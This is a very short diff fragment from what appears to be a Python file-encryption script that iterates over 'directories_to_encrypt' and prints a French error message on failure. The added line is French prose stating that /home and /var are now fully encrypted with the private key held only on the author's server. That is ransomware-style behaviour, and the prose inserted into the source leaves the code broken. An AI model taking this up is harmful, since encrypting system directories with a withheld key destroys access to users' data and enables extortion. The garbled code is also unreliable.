@@ -202,4 +202,5 @@ for directory in directories_to_encrypt:
                 print(f"Erreur lors du chiffrement de {file_path}: {e}")
 
 
+J'ai maintenant les dossiers /home et /var entièrement chiffrés avec la clef privée uniquement sur mon serveur : 
 
